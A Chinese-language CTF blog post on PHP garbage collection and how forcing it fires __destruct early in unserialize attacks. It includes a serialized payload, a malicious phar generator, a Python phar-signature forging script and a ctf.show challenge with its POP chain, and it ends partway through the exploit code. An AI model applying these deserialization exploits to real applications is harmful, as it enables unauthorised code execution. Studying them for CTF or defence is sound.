@@ -1,0 +1,437 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <title>PHP_GC垃圾回收机制 // main1o</title>
+    <link rel="shortcut icon" href="ICON.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.152.2">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="PHP_GC垃圾回收机制">
+  <meta name="twitter:description" content="PHP底层 GC 垃圾回收机制 PHP: 引用计数基本知识 - Manual
+建议一定先看完 PHP官方手册的说明
+简单理解为一个对象没有被引用的时候 就会被GC机制回收 在被回收的同时 会触发__destruct()方法 这是一个关键点~
+refcount变量引用计数 is_ref是否被引用 bool值
+调试工具Xdebug - Debugger and Profiler Tool for PHP 如果是小皮面板的话直接 php扩展开启就行了
+PHP不同版本下GC机制有变化 以下环境为PHP 5.4.45模拟
+PHP 深浅拷贝 在 PHP 中引用意味着用不同的名字访问同一个变量内容。这并不像 C 的指针：例如你不能对他们做指针运算，他们并不是实际的内存地址。替代的是，引用是符号表别名。注意在PHP 中，变量名和变量内容是不一样的，因此同样的内容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——变量名是目录条目，而变量内容则是文件本身。引用可以被看作是 Unix 文件系统中的硬链接
+引用取消 则需要使用unset()只是断开了变量名和变量内容之间的绑定,并不是说变量内容被销毁了
+深拷贝： 赋值时值完全复制对其中一个作出改变，不会影响另一个
+在PHP5以上，对象的 = 赋值和传递都是引用(浅)。php提供了clone函数实现拷贝副本
+直接把$a赋值给$b之后，$b修改并不会对$a任何影响，可以看到2次输出都是main1o
+变量$a引用计数值refcount也为1，并且is_ref也是false
+对象的深拷贝 用clone函数拷贝出一个完全一样的对象，修改该对象，并不会影响原始对象
+修改$a对象，只会对$b对象有影响，并不会对$c对象有任何影响
+浅拷贝： 赋值时，引用赋值，相当于取了一个别名。对其中一个修改，会影响另一个
+使用&amp;来使用自定义引用变量，我们对$a进行修改 直接影响了$b “main1o” –&gt; “ikun”
+就是$a 和$b都指向内存中的同一块地址
+反序列化中的作用 补充：
+方法名 作用 __construct 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值 __destruct 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用 即对象被销毁触发！手动销毁为unset(Object) 手动销毁对象unset()触发了$a对象中的析构函数。提前输出了 1__destruct()">
+
+    <meta property="og:url" content="https://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/">
+  <meta property="og:site_name" content="main1o">
+  <meta property="og:title" content="PHP_GC垃圾回收机制">
+  <meta property="og:description" content="PHP底层 GC 垃圾回收机制 PHP: 引用计数基本知识 - Manual
+建议一定先看完 PHP官方手册的说明
+简单理解为一个对象没有被引用的时候 就会被GC机制回收 在被回收的同时 会触发__destruct()方法 这是一个关键点~
+refcount变量引用计数 is_ref是否被引用 bool值
+调试工具Xdebug - Debugger and Profiler Tool for PHP 如果是小皮面板的话直接 php扩展开启就行了
+PHP不同版本下GC机制有变化 以下环境为PHP 5.4.45模拟
+PHP 深浅拷贝 在 PHP 中引用意味着用不同的名字访问同一个变量内容。这并不像 C 的指针：例如你不能对他们做指针运算，他们并不是实际的内存地址。替代的是，引用是符号表别名。注意在PHP 中，变量名和变量内容是不一样的，因此同样的内容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——变量名是目录条目，而变量内容则是文件本身。引用可以被看作是 Unix 文件系统中的硬链接
+引用取消 则需要使用unset()只是断开了变量名和变量内容之间的绑定,并不是说变量内容被销毁了
+深拷贝： 赋值时值完全复制对其中一个作出改变，不会影响另一个
+在PHP5以上，对象的 = 赋值和传递都是引用(浅)。php提供了clone函数实现拷贝副本
+直接把$a赋值给$b之后，$b修改并不会对$a任何影响，可以看到2次输出都是main1o
+变量$a引用计数值refcount也为1，并且is_ref也是false
+对象的深拷贝 用clone函数拷贝出一个完全一样的对象，修改该对象，并不会影响原始对象
+修改$a对象，只会对$b对象有影响，并不会对$c对象有任何影响
+浅拷贝： 赋值时，引用赋值，相当于取了一个别名。对其中一个修改，会影响另一个
+使用&amp;来使用自定义引用变量，我们对$a进行修改 直接影响了$b “main1o” –&gt; “ikun”
+就是$a 和$b都指向内存中的同一块地址
+反序列化中的作用 补充：
+方法名 作用 __construct 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值 __destruct 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用 即对象被销毁触发！手动销毁为unset(Object) 手动销毁对象unset()触发了$a对象中的析构函数。提前输出了 1__destruct()">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2022-09-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-09-09T00:00:00+00:00">
+    <meta property="article:tag" content="Php">
+    <meta property="article:tag" content="Ctf">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="/avatar.jpg" alt="John Doe" /></a>
+      <span class="app-header-title">main1o</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>荆棘之路</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">PHP_GC垃圾回收机制</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Sep 9, 2022
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          2 min read
+        </div>
+        <div>
+          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
+              <a class="tag" href="/tags/php/">Php</a>
+              <a class="tag" href="/tags/ctf/">Ctf</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="php底层-gc-垃圾回收机制">PHP底层 GC 垃圾回收机制</h1>
+<blockquote>
+<p><a href="https://www.php.net/manual/zh/features.gc.refcounting-basics.php">PHP: 引用计数基本知识 - Manual</a></p>
+</blockquote>
+<p><strong>建议一定先看完 PHP官方手册的说明</strong></p>
+<p>简单理解为一个对象没有被引用的时候 就会被<code>GC</code>机制回收 在被回收的同时 会触发<code>__destruct()</code>方法 这是一个关键点~</p>
+<p><code>refcount</code>变量引用计数  	<code>is_ref</code>是否被引用 bool值</p>
+<p>调试工具<a href="http://xdebug.org/">Xdebug - Debugger and Profiler Tool for PHP</a>  如果是小皮面板的话直接 <strong>php扩展</strong>开启就行了</p>
+<p>PHP不同版本下<strong>GC机制</strong>有变化   以下环境为<code>PHP 5.4.45</code>模拟</p>
+<h2 id="php-深浅拷贝">PHP 深浅拷贝</h2>
+<blockquote>
+<p>在 PHP 中引用意味着用不同的名字访问同一个变量内容。这并不像 C 的指针：例如你不能对他们做指针运算，他们并不是实际的内存地址。替代的是，引用是符号表别名。注意在PHP 中，变量名和变量内容是不一样的，因此同样的内容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——变量名是目录条目，而变量内容则是文件本身。引用可以被看作是 Unix 文件系统中的硬链接</p>
+</blockquote>
+<p><strong>引用取消</strong> 则需要使用<code>unset()</code>只是断开了变量名和变量内容之间的绑定,并不是说变量内容被销毁了</p>
+<h3 id="深拷贝">深拷贝：</h3>
+<blockquote>
+<p>赋值时值完全复制对其中一个作出改变，不会影响另一个</p>
+<p>在PHP5以上，对象的 = 赋值和传递都是引用(浅)。php提供了<code>clone</code>函数实现拷贝副本</p>
+</blockquote>
+<p>直接把<code>$a</code>赋值给<code>$b</code>之后，<code>$b</code>修改并不会对<code>$a</code>任何影响，可以看到2次输出都是<code>main1o</code></p>
+<p>变量<code>$a</code>引用计数值<code>refcount</code>也为1，并且<code>is_ref</code>也是false</p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657.png" alt="image-20221120132330657"></p>
+<p>对象的深拷贝  用clone函数拷贝出一个完全一样的对象，修改该对象，并不会影响原始对象</p>
+<p>修改<code>$a</code>对象，只会对<code>$b</code>对象有影响，并不会对<code>$c</code>对象有任何影响</p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985.png" alt="image-20221120134851985"></p>
+<h3 id="浅拷贝">浅拷贝：</h3>
+<blockquote>
+<p>赋值时，引用赋值，相当于取了一个别名。对其中一个修改，会影响另一个</p>
+</blockquote>
+<p>使用<code>&amp;</code>来使用自定义引用变量，我们对<code>$a</code>进行修改 直接影响了<code>$b</code> “main1o” &ndash;&gt; &ldquo;ikun&rdquo;</p>
+<p>就是<code>$a</code> 和<code>$b</code>都指向内存中的同一块地址</p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873.png" alt="image-20221120140131873"></p>
+<h2 id="反序列化中的作用">反序列化中的作用</h2>
+<p>补充：</p>
+<table>
+  <thead>
+      <tr>
+          <th>方法名</th>
+          <th>作用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>__construct</td>
+          <td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td>
+      </tr>
+      <tr>
+          <td>__destruct</td>
+          <td>析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为<code>null</code>)或者<code>程序退出</code>时自动调用 即对象被销毁触发！手动销毁为<code>unset(Object)</code></td>
+      </tr>
+  </tbody>
+</table>
+<p>手动销毁对象<code>unset()</code>触发了<code>$a</code>对象中的析构函数。提前输出了 1__destruct()</p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001.png" alt="image-20221120144320001"></p>
+<p>还有对象引用被视为null 也会触发，这里举个例子</p>
+<p>变量赋值都是 <strong>自右向左</strong> 所以数组中的第二个元素0 覆盖了对象失去了引用，那么就满足触发GC回收了。即触发<code>__destruct</code></p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356.png" alt="image-20221120150717356"></p>
+<h3 id="demo-">Demo :</h3>
+<p>最后一行代码错误抛出异常，是无法触发<code>__destruct </code>  需要正常结束程序</p>
+<p>那我们就可以通过上面介绍的触发<code>GC机制</code> 来绕过。这里将第二个索引置空。</p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396.png" alt="image-20221120152723396"></p>
+<p><strong>Payload：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;B&#34;</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424.png" alt="image-20221120160431424"> <img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716.png" alt="image-20221120160507716"></p>
+<h3 id="gc-phar反序列化利用">GC Phar反序列化利用:</h3>
+<p>Phar反序列化，使用<code>file_get_contents()</code>函数，先按照正常流程去生成一个<code>.phar</code>文件</p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572.png" alt="image-20221120161313572"></p>
+<p>生成步骤就不一一累述了，注意需要开启<code>php.ini</code>中的<code>phar.readonly = Off</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">test</span><span class="p">{</span><span class="k">public</span> <span class="nv">$code</span><span class="o">=</span> <span class="s2">&#34;phpinfo();&#34;</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;1.phar&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER();?&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;test&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于生成的phar文件不能随意修改，否则签名不匹配。先按照原来的方法修改数组值，然后在通过脚本进行伪造签名。</p>
+<p>使用16进制编辑器打开 可以看到<code>i:1</code>修改为<code>i:0</code>  保存</p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824.png" alt="image-20221120162413824"></p>
+<p>exp.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gzip</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;1.phar&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">[:</span><span class="o">-</span><span class="mi">28</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="o">-</span><span class="mi">8</span><span class="p">:]</span> 
+</span></span><span class="line"><span class="cl"><span class="n">newf</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="n">sha1</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span> <span class="o">+</span> <span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;2.phar&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">newf</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接着使用<code>phar://</code> 伪协议包含2.phar这个文件即可,成功执行了</p>
+<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285.png" alt="image-20221120162937285"></p>
+<h2 id="例题">例题：</h2>
+<blockquote>
+<p>[ctf.show](<a href="https://ctf.show/challenges#easy">https://ctf.show/challenges#easy</a> unserialize-1806)</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;./HappyYear.php&#34;</span><span class="p">);</span>				<span class="c1">// flag文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">one</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$object</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">MeMeMe</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">array_walk</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nv">$prev</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$fn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;Happy_func&#34;</span> <span class="o">&amp;&amp;</span> <span class="nv">$prev</span> <span class="o">===</span> <span class="s2">&#34;year_parm&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">global</span> <span class="nv">$talk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$talk</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">second</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="k">function</span> <span class="nf">addMe</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Wow you have sovled&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">;</span> 		<span class="c1">// 字符和对象进行拼接 可以触发one()::__toString()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">call_user_func</span><span class="p">([</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$func</span><span class="o">.</span><span class="s2">&#34;Me&#34;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>	 		<span class="c1">// 接受不存在的属性名和值，拼接然后通过call_user_func() 函数调用内部
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">third</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">string</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$name</span><span class="p">;</span>	<span class="c1">// $name为外部传的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$var</span><span class="p">[</span><span class="nv">$name</span><span class="p">]();</span>			<span class="c1">// 数组调用类
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$a</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;高一新生报道&#34;</span><span class="p">);</span> <span class="c1">// 抛出异常会停止所有操作
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>POP链子：</p>
+<p><strong>one::__destruct =&gt; second::__call=&gt; second::addMe =&gt; one::__toString =&gt; third::__get =&gt; one::MeMeMe</strong></p>
+<p>因为异常抛出的原因，需要通过gc垃圾回收提前触发析构函数(<code>__destruct()</code>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">one</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">second</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">one</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">third</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;string&#34;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="k">new</span> <span class="nx">one</span><span class="p">(),</span> <span class="nx">MeMeMe</span><span class="p">]));</span>
